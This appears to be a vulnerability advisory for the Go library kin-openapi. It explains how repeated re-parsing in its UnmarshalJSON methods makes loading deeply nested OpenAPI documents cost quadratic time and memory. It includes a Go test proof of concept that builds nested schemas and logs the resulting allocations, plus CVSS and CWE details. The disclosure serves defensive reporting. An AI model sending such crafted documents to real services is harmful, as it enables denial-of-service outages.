### Summary

Loading an OpenAPI document with `github.com/getkin/kin-openapi` takes time and
memory that grow **quadratically** with the nesting depth of the document. A
small, structurally simple document (tens to a few hundred kilobytes) that nests
schemas deeply can force the loader to consume tens of seconds of CPU and
multiple gigabytes of transient memory, causing denial of service. The cost is
incurred entirely during the **load/unmarshal** phase (`LoadFromData`,
`LoadFromFile`, `LoadFromURI`), before any call to `Validate` and without any
special configuration or request handling. Any application that loads or
processes an OpenAPI document originating from an untrusted or
attacker-influenced source is affected.

### Details

kin-openapi implements custom `UnmarshalJSON` methods for its object types. The
root cause is that these methods **re-parse the same input bytes multiple times
at every nesting level**.

For `Schema`, in `openapi3/schema.go`:

```go
// UnmarshalJSON sets Schema to a copy of data.
func (schema *Schema) UnmarshalJSON(data []byte) error {
	type SchemaBis Schema
	var x SchemaBis
	if err := json.Unmarshal(data, &x); err != nil {   // schema.go:691 — first full decode
		return unmarshalError(err)
	}
	_ = json.Unmarshal(data, &x.Extensions)             // schema.go:694 — second full decode

	delete(x.Extensions, "oneOf")
	delete(x.Extensions, "anyOf")
	// ... more delete() of known keys ...
```

- Line **691** decodes `data` into the typed `SchemaBis` value. Because the
  `items` field is itself a schema, this recurses into the nested subtree,
  invoking `Schema.UnmarshalJSON` again on the child.
- Line **694** decodes the **same** `data` a second time, this time into
  `x.Extensions`. `Extensions` is declared as `map[string]any`
  (`openapi3/schema.go:84`):

  ```go
  type Schema struct {
      Extensions map[string]any `json:"-" yaml:"-"`
      // ...
  }
  ```

  Decoding into `map[string]any` forces the JSON decoder to **generically
  materialize the entire nested subtree** — every descendant object, array, and
  scalar — into `map[string]any` / `[]any` / boxed values, only to immediately
  `delete()` the handful of known keys and discard the rest.

The second decode alone would merely double the work. The problem is that it
happens **at every level of nesting**. Consider a schema nested to depth `D`
(each level being `{"type":"array","items": <child>}`). When the outermost
schema is unmarshalled:

- Its line-691 decode recurses down all `D` levels (each child's
  `UnmarshalJSON` runs once as part of the parent's typed decode).
- Its line-694 decode generically materializes the **whole remaining subtree**
  of size `O(D)`.

The level-1 child then repeats the same on its own subtree of size `O(D-1)`, the
level-2 child on `O(D-2)`, and so on. Summing the generic-materialization cost
over all ancestors gives `D + (D-1) + (D-2) + ... + 1 = O(D^2)` CPU and `O(D^2)`
transient allocation for a document whose actual size is only `O(D)`.

`SchemaRef.UnmarshalJSON` (`openapi3/refs.go:1209-1247`) compounds the effect by
re-parsing its own bytes several times per node:

```go
func (x *SchemaRef) UnmarshalJSON(data []byte) error {
	var refOnly Ref
	if err := json.Unmarshal(data, &refOnly); err == nil && refOnly.Ref != "" {  // parse #1
		extra := map[string]any{}
		_ = json.Unmarshal(data, &extra)                                          // parse #2
		// ...
		if hasSiblings {
			var sibling Schema
			if err := json.Unmarshal(data, &sibling); err == nil {                // parse #3
				x.sibling = &sibling
			}
		}
		// ...
		return nil
	}
	return json.Unmarshal(data, &x.Value)                                         // parse (non-ref path)
}
```

Every `items` / `properties` / `oneOf` / `anyOf` / `allOf` value flows through
`SchemaRef.UnmarshalJSON` on the way to `Schema.UnmarshalJSON`, so the constant
factor per level is several full re-scans, not one.

This is not specific to `Schema`. The same repeated-parse
`json.Unmarshal(data, &x)` + `_ = json.Unmarshal(data, &x.Extensions)` pattern
(with `Extensions map[string]any`) is present in the `UnmarshalJSON` methods of
essentially every object type in the package — `components.go`, `media_type.go`,
`operation.go`, `parameter.go`, `path_item.go`, `response.go`,
`request_body.go`, `openapi3.go`, and more (21 files in total). Any nesting axis
that the object graph supports therefore exhibits the same quadratic blow-up.

**Bound / honesty note.** The amplification is **not unbounded**. The
underlying JSON and YAML parsers cap nesting depth at roughly **10000**, so the
worst-case amplification factor is on the order of `10^4x` rather than
arbitrarily large. That is still more than enough for a small document to be
weaponized: a document only a few hundred kilobytes in size, nested close to the
cap, drives load time into tens of seconds and transient memory into the
multiple-gigabyte range — sufficient to exhaust memory or stall a service. The
attack requires no valid document (the cost is paid during unmarshalling, before
validation) and no special loader configuration.

### PoC

The following self-contained test reproduces the quadratic behavior. It builds a
document containing a single schema nested to depth `D` and measures load time
and transient allocation for `D = 1000` and `D = 2000`. Doubling the depth (and
thus the document size) roughly **quadruples** the cost, which is the signature
of `O(D^2)` complexity. Defaults are kept safe (well under ~1 GB) so the test
itself does not risk the host.

Save as `openapi3/advisory_poc_test.go`:

```go
package openapi3_test

import (
	"runtime"
	"strings"
	"testing"
	"time"

	"github.com/getkin/kin-openapi/openapi3"
)

func nestedSchemaSpec(d int) string {
	var sb strings.Builder
	sb.WriteString(`{"openapi":"3.0.0","info":{"title":"PoC","version":"1"},"paths":{},"components":{"schemas":{"X":`)
	sb.WriteString(strings.Repeat(`{"type":"array","items":`, d))
	sb.WriteString(`{"type":"string"}`)
	sb.WriteString(strings.Repeat(`}`, d))
	sb.WriteString(`}}}`)
	return sb.String()
}

func measureLoad(d int) (time.Duration, uint64, int) {
	spec := nestedSchemaSpec(d)
	var m0, m1 runtime.MemStats
	runtime.GC()
	runtime.ReadMemStats(&m0)
	start := time.Now()
	loader := openapi3.NewLoader()
	_, _ = loader.LoadFromData([]byte(spec))
	el := time.Since(start)
	runtime.ReadMemStats(&m1)
	return el, m1.TotalAlloc - m0.TotalAlloc, len(spec)
}

// A small document with a deeply nested schema forces O(depth^2) re-parsing
// during LoadFromData: every nesting level re-scans/re-decodes its subtree.
func TestPoCSchemaUnmarshalQuadratic(t *testing.T) {
	e1, a1, n1 := measureLoad(1000)
	e2, a2, n2 := measureLoad(2000)
	mb1, mb2 := a1/(1024*1024), a2/(1024*1024)
	t.Logf("depth=1000 (%d B) -> %v, %d MB ; depth=2000 (%d B) -> %v, %d MB (2x depth ~ 4x cost)", n1, e1, mb1, n2, e2, mb2)
	if mb2 > 300 {
		t.Fatalf("VULNERABLE: a %d B document allocated %d MB during load (quadratic; near the ~10000 depth cap a ~250 KB doc reaches tens of GB / tens of seconds)", n2, mb2)
	}
}
```

Run:

```
go test ./openapi3/ -run TestPoCSchemaUnmarshalQuadratic -v -timeout 300s
```

Observed output (Go 1.25, kin-openapi at v0.145.0):

```
=== RUN   TestPoCSchemaUnmarshalQuadratic
    advisory_poc_test.go:41: depth=1000 (25116 B) -> 950.328108ms, 224 MB ; depth=2000 (50116 B) -> 2.783484844s, 906 MB (2x depth ~ 4x cost)
    advisory_poc_test.go:43: VULNERABLE: a 50116 B document allocated 906 MB during load (quadratic; near the ~10000 depth cap a ~250 KB doc reaches tens of GB / tens of seconds)
--- FAIL: TestPoCSchemaUnmarshalQuadratic (3.75s)
FAIL
```

Interpretation of the measured numbers:

- **depth 1000** — a **25,116-byte** document allocated **224 MB** and took
  **~0.95 s** to load.
- **depth 2000** — a **50,116-byte** document (2x the size) allocated **906 MB**
  and took **~2.78 s** to load.

Doubling the depth multiplied allocation by ~4.0x (224 MB → 906 MB) and time by
~2.9x — the quadratic signature. Extrapolating toward the ~10000 depth cap, a
document on the order of ~250 KB reaches the tens-of-gigabytes / tens-of-seconds
range, i.e. a practical memory-exhaustion / CPU-exhaustion DoS from a tiny
input.

### Impact

Denial of service (CPU exhaustion and, more severely, memory exhaustion) against
any application that loads or otherwise unmarshals an OpenAPI document from an
untrusted or attacker-influenced source using any `Load*` entry point
(`LoadFromData`, `LoadFromFile`, `LoadFromURI`) or by unmarshalling into the
package's types directly. A single small request/upload/file (tens to a few
hundred kilobytes) can drive a service into multi-gigabyte transient allocation
and multi-second-to-multi-tens-of-seconds stalls, potentially triggering
out-of-memory kills. No authentication, no valid/parseable-past-load document,
no call to `Validate`, and no special loader configuration are required — the
cost is paid during unmarshalling. The amplification factor is bounded (on the
order of `10^4x`) by the parser's ~10000 nesting-depth cap, so this is a
resource-consumption DoS rather than an unbounded one, but the bound is high
enough to be exploitable in practice.

---

- **Ecosystem:** Go
- **Package:** github.com/getkin/kin-openapi
- **Affected versions:** all released versions up to and including v0.145.0.
- **CVSS v3.1:** 7.5 (High) — `AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H`. Precondition
  note: impact applies to applications that load or process OpenAPI documents
  from untrusted sources; the amplification is bounded (~`10^4x`) by the parser's
  ~10000 nesting-depth cap, making this a bounded resource-consumption DoS.
- **CWE:** primary **CWE-407** (Inefficient Algorithmic Complexity); also
  **CWE-400** (Uncontrolled Resource Consumption) and **CWE-770** (Allocation of
  Resources Without Limits or Throttling).
- **Advisory relationship:** Novel — this concerns kin-openapi's own repeated-parse
  `UnmarshalJSON` pattern and is not covered by any published advisory.
